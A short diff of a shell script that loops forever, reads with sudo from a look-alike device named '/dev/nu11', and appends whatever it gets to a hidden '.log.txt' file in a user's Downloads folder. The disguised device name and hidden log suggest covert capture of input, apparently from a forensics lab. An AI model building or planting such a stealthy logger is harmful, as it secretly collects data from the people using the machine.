@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 
 endlessloop() {
         while [ 1 ]
@@ -6,11 +6,11 @@ endlessloop() {
                 text=$(sudo cat /dev/nu11)
                 if [ "$text" = ""  ]
                 then
-                        sleep 30
+			:
                 else
-                        echo -n $text >> ./.log.txt
+                        echo -n $text >> /home/sherlock/Downloads/.log.txt
                 fi
         done
 }
 
-endlessloop &
+endlessloop
